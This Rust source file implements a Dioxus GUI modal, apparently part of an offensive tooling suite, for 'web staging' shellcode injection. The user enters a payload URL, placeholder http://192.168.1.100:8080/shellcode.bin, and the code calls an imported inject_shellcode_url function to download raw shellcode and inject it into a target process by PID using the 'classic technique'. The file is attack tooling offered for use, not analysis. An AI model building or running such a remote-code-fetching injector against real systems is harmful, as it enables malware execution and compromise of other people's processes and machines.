//! Shellcode Inject Window component (Web Staging)

use dioxus::prelude::*;
use misc::inject_shellcode_url;

use crate::state::SHELLCODE_INJECT_WINDOW_STATE;

/// Shellcode Inject Window modal component
#[component]
pub fn ShellcodeInjectWindow(pid: u32, process_name: String) -> Element {
    let mut payload_url = use_signal(|| String::new());
    let mut status_message = use_signal(|| String::new());
    let mut status_is_error = use_signal(|| false);
    let mut is_running = use_signal(|| false);

    let close_window = move |_| {
        *SHELLCODE_INJECT_WINDOW_STATE.write() = None;
    };

    let target_pid = pid;

    let handle_inject = move |_| {
        if *is_running.read() {
            return;
        }

        let url = payload_url.read().clone();

        if url.is_empty() {
            status_message.set("Please enter a payload URL".to_string());
            status_is_error.set(true);
            return;
        }

        if !url.starts_with("http://") && !url.starts_with("https://") {
            status_message.set("URL must start with http:// or https://".to_string());
            status_is_error.set(true);
            return;
        }

        is_running.set(true);
        status_message.set(String::new());

        spawn(async move {
            let result = tokio::task::spawn_blocking(move || {
                inject_shellcode_url(target_pid, &url)
            })
            .await;

            match result {
                Ok(Ok(())) => {
                    status_message.set(format!(
                        "Shellcode downloaded and injected into process {} (Web Staging)",
                        target_pid
                    ));
                    status_is_error.set(false);
                }
                Ok(Err(e)) => {
                    status_message.set(format!("Error: {}", e));
                    status_is_error.set(true);
                }
                Err(e) => {
                    status_message.set(format!("Task error: {}", e));
                    status_is_error.set(true);
                }
            }

            is_running.set(false);

            if !*status_is_error.read() {
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                status_message.set(String::new());
            }
        });
    };

    let status_msg = status_message.read().clone();
    let is_error = *status_is_error.read();
    let running = *is_running.read();

    rsx! {
        div {
            class: "create-process-modal-overlay",
            onclick: close_window,

            div {
                class: "create-process-modal",
                onclick: move |e| e.stop_propagation(),

                // Header
                div { class: "create-process-modal-header",
                    span { class: "create-process-modal-title",
                        "Shellcode Injection (Web Staging) - {process_name} (PID {pid})"
                    }
                    button {
                        class: "create-process-modal-close",
                        onclick: close_window,
                        "X"
                    }
                }

                // Body
                div { class: "create-process-form",
                    // Description
                    div { class: "create-process-field",
                        label { class: "create-process-label", "Description" }
                        input {
                            class: "create-process-input",
                            r#type: "text",
                            readonly: true,
                            value: "Download raw shellcode from URL and inject via classic technique",
                        }
                    }

                    // Payload URL
                    div { class: "create-process-field",
                        label { class: "create-process-label", "Payload URL" }
                        input {
                            class: "create-process-input",
                            r#type: "text",
                            placeholder: "http://192.168.1.100:8080/shellcode.bin",
                            value: "{payload_url}",
                            oninput: move |e| payload_url.set(e.value().clone()),
                        }
                    }

                    // Status message
                    if !status_msg.is_empty() {
                        div {
                            class: if is_error { "create-process-status create-process-status-error" } else { "create-process-status create-process-status-success" },
                            "{status_msg}"
                        }
                    }
                }

                // Actions
                div { class: "create-process-actions",
                    button {
                        class: "btn-cancel",
                        onclick: close_window,
                        "Cancel"
                    }
                    button {
                        class: "btn btn-primary",
                        disabled: running,
                        onclick: handle_inject,
                        if running {
                            "Downloading & Injecting..."
                        } else {
                            "Inject"
                        }
                    }
                }
            }
        }
    }
}
